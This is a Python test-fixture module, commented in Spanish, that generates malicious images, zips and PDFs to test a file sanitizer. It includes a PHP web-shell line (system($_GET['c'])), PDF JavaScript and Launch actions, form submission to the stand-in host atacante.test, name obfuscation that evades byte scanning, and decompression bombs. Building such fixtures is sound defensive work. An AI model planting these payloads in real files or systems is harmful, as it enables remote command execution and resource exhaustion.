"""Archivos de ataque generados en tiempo de ejecución: no hay binarios en el repositorio."""

import binascii
import io
import secrets
import struct
import zipfile
import zlib
from functools import lru_cache

import pikepdf
from pikepdf import Array, Dictionary, Name, String
from PIL import Image
from PIL.PngImagePlugin import PngInfo

MIB = 1024 * 1024
TEXTO_PAGINA = b"BT /F1 12 Tf 10 10 Td (contenido legitimo) Tj ET"


def marca() -> str:
    """Texto único por prueba: si aparece en la salida es porque se copió de la entrada."""
    return f"gk{secrets.token_hex(12)}"


def carga_php(texto: str) -> bytes:
    return b"<?php /* %s */ system($_GET['c']); ?>" % texto.encode()


# ---------------------------------------------------------------------------------------- imágenes


def imagen(ancho: int = 32, alto: int = 32, modo: str = "RGB") -> Image.Image:
    """Imagen con píxeles distintos entre sí, para notar una reconstrucción en blanco."""
    lienzo = Image.new("RGB", (ancho, alto))
    lienzo.putdata(
        [
            (x * 7 % 256, y * 11 % 256, (x + y) * 5 % 256)
            for y in range(alto)
            for x in range(ancho)
        ]
    )
    convertido = lienzo.convert(modo)
    if modo == "RGBA":
        # Transparencia variable: con alfa uniforme, perderla no se notaría en los píxeles.
        convertido.putalpha(lienzo.convert("L"))
    return convertido


def png(lienzo: Image.Image | None = None, **opciones: object) -> bytes:
    salida = io.BytesIO()
    (lienzo or imagen()).save(salida, "PNG", **opciones)
    return salida.getvalue()


def jpeg(lienzo: Image.Image | None = None, **opciones: object) -> bytes:
    salida = io.BytesIO()
    (lienzo or imagen()).save(salida, "JPEG", quality=90, **opciones)
    return salida.getvalue()


def png_con_texto(texto: str) -> bytes:
    info = PngInfo()
    info.add_text("Comment", texto)
    info.add_itxt("Description", texto)
    return png(pnginfo=info)


def png_con_texto_comprimido(texto: str) -> bytes:
    info = PngInfo()
    info.add_text("Comment", texto, zip=True)
    return png(pnginfo=info)


def png_con_fragmento_privado(texto: str) -> bytes:
    info = PngInfo()
    info.add(b"gkPL", texto.encode())
    return png(pnginfo=info)


def jpeg_con_exif(texto: str) -> bytes:
    exif = Image.Exif()
    exif[0x010E] = texto  # ImageDescription
    return jpeg(exif=exif)


def png_con_exif(texto: str) -> bytes:
    exif = Image.Exif()
    exif[0x010E] = texto
    return png(exif=exif)


def _fragmento_png(tipo: bytes, datos: bytes) -> bytes:
    crc = zlib.crc32(tipo + datos)
    return struct.pack(">I", len(datos)) + tipo + datos + struct.pack(">I", crc)


@lru_cache(maxsize=4)
def png_bomba(ancho: int, alto: int) -> bytes:
    """PNG RGB válido, de pocos KB, que al decodificarse ocupa ``ancho * alto * 4`` bytes.

    Se arma a mano: generarlo con Pillow costaría en la prueba la memoria que se quiere medir.
    """
    compresor = zlib.compressobj(9)
    fila = bytes(ancho * 3 + 1)
    idat = b"".join(compresor.compress(fila) for _ in range(alto)) + compresor.flush()
    ihdr = struct.pack(">IIBBBBB", ancho, alto, 8, 2, 0, 0, 0)
    return (
        b"\x89PNG\r\n\x1a\n"
        + _fragmento_png(b"IHDR", ihdr)
        + _fragmento_png(b"IDAT", idat)
        + _fragmento_png(b"IEND", b"")
    )


def jpeg_con_dimensiones(ancho: int, alto: int) -> bytes:
    """JPEG real cuyas dimensiones declaradas se cambian en el marcador SOF0."""
    datos = bytearray(jpeg())
    sof = datos.index(b"\xff\xc0")
    datos[sof + 5 : sof + 9] = struct.pack(">HH", alto, ancho)
    return bytes(datos)


def fragmentos_png(datos: bytes) -> list[str]:
    """Tipos de los fragmentos de un PNG. Falla si hay bytes después de IEND."""
    posicion = 8
    tipos = []
    while posicion < len(datos):
        largo = struct.unpack(">I", datos[posicion : posicion + 4])[0]
        tipos.append(datos[posicion + 4 : posicion + 8].decode("latin-1"))
        posicion += 12 + largo
        if tipos[-1] == "IEND":
            break
    assert posicion == len(datos), "hay datos después de IEND"
    return tipos


def segmentos_jpeg(datos: bytes) -> list[int]:
    """Marcadores de un JPEG hasta el inicio de los datos de imagen (SOS)."""
    posicion = 2
    marcadores = []
    while True:
        assert datos[posicion] == 0xFF
        marcador = datos[posicion + 1]
        if marcador == 0xDA:
            return marcadores
        marcadores.append(marcador)
        posicion += 2 + struct.unpack(">H", datos[posicion + 2 : posicion + 4])[0]


# -------------------------------------------------------------------------------------- contenedores


def zip_con(contenido: bytes) -> bytes:
    salida = io.BytesIO()
    with zipfile.ZipFile(salida, "w", zipfile.ZIP_STORED) as archivo:
        archivo.writestr("carga.php", contenido)
    return salida.getvalue()


# --------------------------------------------------------------------------------------------- PDF


def pdf_base(paginas: int = 1) -> pikepdf.Pdf:
    pdf = pikepdf.new()
    for _ in range(paginas):
        pagina = pdf.add_blank_page(page_size=(200, 200))
        pagina.Contents = pdf.make_stream(TEXTO_PAGINA)
    return pdf


def guardar(pdf: pikepdf.Pdf, **opciones: object) -> bytes:
    salida = io.BytesIO()
    # Sin recomprimir: con `compress_streams`, qpdf reescribe los flujos con varios filtros y la
    # cadena de una bomba desaparecería del archivo que se quiere probar.
    opciones.setdefault("stream_decode_level", pikepdf.StreamDecodeLevel.none)
    opciones.setdefault("compress_streams", False)
    pdf.save(salida, **opciones)
    return salida.getvalue()


def _accion_js(codigo: str) -> Dictionary:
    return Dictionary(S=Name.JavaScript, JS=String(codigo))


def pdf_open_action(texto: str) -> bytes:
    pdf = pdf_base()
    pdf.Root.OpenAction = _accion_js(f"app.alert('{texto}')")
    return guardar(pdf)


def pdf_open_action_en_flujo(texto: str) -> bytes:
    """El código va en un flujo comprimido: buscarlo en los bytes crudos no lo encuentra."""
    pdf = pdf_base()
    pdf.Root.OpenAction = pdf.make_indirect(
        Dictionary(
            S=Name.JavaScript, JS=pdf.make_stream(f"app.alert('{texto}')".encode())
        )
    )
    return guardar(
        pdf,
        compress_streams=True,
        stream_decode_level=pikepdf.StreamDecodeLevel.generalized,
    )


def pdf_en_flujos_de_objetos(texto: str) -> bytes:
    """Las acciones quedan dentro de un /ObjStm comprimido, invisibles en los bytes crudos."""
    pdf = pdf_base()
    pdf.Root.OpenAction = pdf.make_indirect(_accion_js(f"app.alert('{texto}')"))
    return guardar(
        pdf,
        object_stream_mode=pikepdf.ObjectStreamMode.generate,
        stream_decode_level=None,
    )


def pdf_aa_nodo_de_paginas(texto: str) -> bytes:
    """/AA en un nodo intermedio de /Pages: recorrer solo `pdf.pages` no lo ve."""
    pdf = pdf_base()
    pdf.Root.Pages.AA = Dictionary(O=_accion_js(f"app.alert('{texto}')"))
    return guardar(pdf)


def pdf_accion_en_clave_propia(texto: str) -> bytes:
    """Acción colgada de una clave que nadie conoce: lista cerrada de claves no la encuentra."""
    pdf = pdf_base()
    pdf.Root.GkOculto = pdf.make_indirect(_accion_js(f"app.alert('{texto}')"))
    return guardar(pdf)


def pdf_aa_catalogo(texto: str) -> bytes:
    pdf = pdf_base()
    pdf.Root.AA = Dictionary(WC=_accion_js(f"app.alert('{texto}')"))
    return guardar(pdf)


def pdf_aa_pagina(texto: str) -> bytes:
    pdf = pdf_base()
    pdf.pages[0].AA = Dictionary(O=_accion_js(f"app.alert('{texto}')"))
    return guardar(pdf)


def pdf_names_javascript(texto: str) -> bytes:
    pdf = pdf_base()
    pdf.Root.Names = Dictionary(
        JavaScript=Dictionary(
            Names=Array([String("inicio"), _accion_js(f"app.alert('{texto}')")])
        )
    )
    return guardar(pdf)


def pdf_embebido(texto: str) -> bytes:
    pdf = pdf_base()
    especificacion = Dictionary(
        Type=Name.Filespec,
        F=String("carga.exe"),
        EF=Dictionary(F=pdf.make_stream(texto.encode(), Type=Name.EmbeddedFile)),
    )
    pdf.Root.Names = Dictionary(
        EmbeddedFiles=Dictionary(Names=Array([String("carga.exe"), especificacion]))
    )
    return guardar(pdf)


def _anotacion(accion: Dictionary) -> Dictionary:
    return Dictionary(
        Type=Name.Annot, Subtype=Name.Link, Rect=Array([0, 0, 100, 100]), A=accion
    )


def pdf_anotacion_launch(texto: str) -> bytes:
    pdf = pdf_base()
    pdf.pages[0].Annots = Array(
        [_anotacion(Dictionary(S=Name.Launch, F=String(f"{texto}.exe")))]
    )
    return guardar(pdf)


def pdf_anotacion_uri(texto: str) -> bytes:
    pdf = pdf_base()
    pdf.pages[0].Annots = Array(
        [
            _anotacion(
                Dictionary(S=Name.URI, URI=String(f"http://atacante.test/{texto}"))
            )
        ]
    )
    return guardar(pdf)


def pdf_submit_form(texto: str) -> bytes:
    pdf = pdf_base()
    campo = pdf.make_indirect(
        Dictionary(
            Type=Name.Annot,
            Subtype=Name.Widget,
            FT=Name.Btn,
            T=String("enviar"),
            Rect=Array([0, 0, 100, 100]),
            A=Dictionary(
                S=Name.SubmitForm,
                F=Dictionary(FS=Name.URL, F=String(f"http://atacante.test/{texto}")),
            ),
        )
    )
    pdf.pages[0].Annots = Array([campo])
    pdf.Root.AcroForm = Dictionary(Fields=Array([campo]))
    return guardar(pdf)


def pdf_marcador_js(texto: str) -> bytes:
    """Acción dentro de /Outlines, que no está en la lista de claves: solo la detecta quien busca
    `/JavaScript` en todo el documento."""
    pdf = pdf_base()
    entrada = pdf.make_indirect(
        Dictionary(Title=String("Inicio"), A=_accion_js(f"app.alert('{texto}')"))
    )
    entrada.Parent = pdf.make_indirect(
        Dictionary(Type=Name.Outlines, First=entrada, Last=entrada, Count=1)
    )
    pdf.Root.Outlines = entrada.Parent
    return guardar(pdf)


def pdf_marcador_launch(texto: str) -> bytes:
    pdf = pdf_base()
    entrada = pdf.make_indirect(
        Dictionary(
            Title=String("Inicio"),
            A=Dictionary(S=Name.Launch, F=String(f"{texto}.exe")),
        )
    )
    entrada.Parent = pdf.make_indirect(
        Dictionary(Type=Name.Outlines, First=entrada, Last=entrada, Count=1)
    )
    pdf.Root.Outlines = entrada.Parent
    return guardar(pdf)


def pdf_datos_anexados(texto: str) -> bytes:
    return guardar(pdf_base()) + b"\n" + carga_php(texto)


def pdf_nombres_ofuscados(texto: str) -> bytes:
    """PDF escrito a mano con `/Java#53cript` y `/Open#41ction`: el `#` es un escape legal en un
    nombre y burla a quien busca el texto en los bytes en vez de analizar el PDF."""
    cuerpos = [
        b"<< /Type /Catalog /Pages 2 0 R /Open#41ction 4 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>",
        b"<< /S /Java#53cript /JS (app.alert\\('%s'\\)) >>" % texto.encode(),
    ]
    salida = bytearray(b"%PDF-1.7\n")
    posiciones = []
    for numero, cuerpo in enumerate(cuerpos, start=1):
        posiciones.append(len(salida))
        salida += b"%d 0 obj\n%s\nendobj\n" % (numero, cuerpo)
    inicio_xref = len(salida)
    salida += b"xref\n0 %d\n0000000000 65535 f \n" % (len(cuerpos) + 1)
    for posicion in posiciones:
        salida += b"%010d 00000 n \n" % posicion
    salida += b"trailer\n<< /Size %d /Root 1 0 R >>\n" % (len(cuerpos) + 1)
    salida += b"startxref\n%d\n%%%%EOF\n" % inicio_xref
    return bytes(salida)


def pdf_con_metadatos(texto: str) -> bytes:
    pdf = pdf_base()
    pdf.docinfo["/Author"] = texto
    pdf.docinfo["/Title"] = texto
    with pdf.open_metadata(set_pikepdf_as_editor=False) as xmp:
        xmp["dc:title"] = texto
    return guardar(pdf)


def pdf_cifrado(propietario: str, usuario: str = "", revision: int = 6) -> bytes:
    return guardar(
        pdf_base(),
        encryption=pikepdf.Encryption(owner=propietario, user=usuario, R=revision),
        stream_decode_level=None,
    )


def objetos_pdf(pdf: pikepdf.Pdf) -> list[object]:
    """Todos los objetos del archivo, también los que no cuelgan del catálogo."""
    return [*pdf.objects, pdf.trailer]


def _directo(valor: object) -> bool:
    """pikepdf devuelve enteros y booleanos como tipos de Python, sin `is_indirect`."""
    return isinstance(valor, pikepdf.Object) and not valor.is_indirect


def nombres_pdf(objeto: object) -> set[str]:
    """Claves y nombres de un objeto, bajando por sus valores directos."""
    if isinstance(objeto, pikepdf.Name):
        return {str(objeto)}
    if isinstance(objeto, pikepdf.Array):
        return {n for valor in objeto if _directo(valor) for n in nombres_pdf(valor)}
    if isinstance(objeto, pikepdf.Dictionary | pikepdf.Stream):
        hallados: set[str] = set()
        # `.keys()` y no `in objeto`: un Stream de pikepdf no se itera como diccionario.
        for clave in objeto.keys():  # noqa: SIM118
            hallados.add(clave)
            valor = objeto[clave]
            if _directo(valor):
                hallados |= nombres_pdf(valor)
        return hallados
    return set()


def texto_del_pdf(pdf: pikepdf.Pdf) -> bytes:
    """Todo lo legible del archivo: cadenas y flujos ya descomprimidos."""
    partes: list[bytes] = []

    def _recorrer(objeto: object) -> None:
        if isinstance(objeto, pikepdf.String):
            partes.append(bytes(objeto))
        elif isinstance(objeto, pikepdf.Array):
            for valor in objeto:
                if _directo(valor):
                    _recorrer(valor)
        elif isinstance(objeto, pikepdf.Dictionary | pikepdf.Stream):
            for clave in objeto.keys():  # noqa: SIM118
                valor = objeto[clave]
                if _directo(valor):
                    _recorrer(valor)
            if isinstance(objeto, pikepdf.Stream):
                partes.append(objeto.read_bytes())

    for objeto in objetos_pdf(pdf):
        _recorrer(objeto)
    return b"\n".join(partes)


# ---------------------------------------------------------------------------------- bombas de flujo


@lru_cache(maxsize=8)
def ceros_comprimidos(mib: int) -> bytes:
    compresor = zlib.compressobj(9)
    bloque = bytes(MIB)
    partes = [compresor.compress(bloque) for _ in range(mib)]
    partes.append(compresor.flush())
    return b"".join(partes)


def pdf_bomba_en_catalogo(mib: int) -> bytes:
    pdf = pdf_base()
    flujo = pdf.make_stream(b"")
    flujo.write(ceros_comprimidos(mib), filter=Name.FlateDecode)
    pdf.Root.GkDatos = pdf.make_indirect(flujo)
    return guardar(pdf)


def pdf_bomba_en_pagina(mib: int) -> bytes:
    pdf = pdf_base()
    flujo = pdf.make_stream(b"")
    flujo.write(ceros_comprimidos(mib), filter=Name.FlateDecode)
    pdf.pages[0].Contents = pdf.make_indirect(flujo)
    return guardar(pdf)


def pdf_bomba_repartida(flujos: int, mib_por_flujo: int) -> bytes:
    """Cada flujo cabe bajo el tope; la suma no. El tope de K13 es por PDF, no por flujo."""
    pdf = pdf_base()
    comprimido = ceros_comprimidos(mib_por_flujo)
    lista = []
    for _ in range(flujos):
        flujo = pdf.make_stream(b"")
        flujo.write(comprimido, filter=Name.FlateDecode)
        lista.append(pdf.make_indirect(flujo))
    pdf.Root.GkDatos = pdf.make_indirect(Array(lista))
    return guardar(pdf)


def pdf_bomba_filtro_en_lista(mib: int) -> bytes:
    """`/Filter [/FlateDecode]`: quien compara con `== /FlateDecode` no la ve."""
    pdf = pdf_base()
    flujo = pdf.make_stream(b"")
    flujo.write(ceros_comprimidos(mib), filter=Name.FlateDecode)
    # `write` convierte una lista de un elemento en un nombre: se fija después.
    flujo.Filter = Array([Name.FlateDecode])
    pdf.Root.GkDatos = pdf.make_indirect(flujo)
    return guardar(pdf)


def pdf_bomba_doble_flate(mib: int) -> bytes:
    """Dos capas: la primera descomprime a poco; la bomba está en la segunda."""
    pdf = pdf_base()
    flujo = pdf.make_stream(b"")
    flujo.write(
        zlib.compress(ceros_comprimidos(mib), 9),
        filter=Array([Name.FlateDecode, Name.FlateDecode]),
    )
    pdf.Root.GkDatos = pdf.make_indirect(flujo)
    return guardar(pdf)


def pdf_bomba_tras_hex(mib: int) -> bytes:
    """`/ASCIIHexDecode` delante de `/FlateDecode`: los bytes crudos no son zlib."""
    pdf = pdf_base()
    flujo = pdf.make_stream(b"")
    flujo.write(
        binascii.hexlify(ceros_comprimidos(mib)) + b">",
        filter=Array([Name.ASCIIHexDecode, Name.FlateDecode]),
    )
    pdf.Root.GkDatos = pdf.make_indirect(flujo)
    return guardar(pdf)
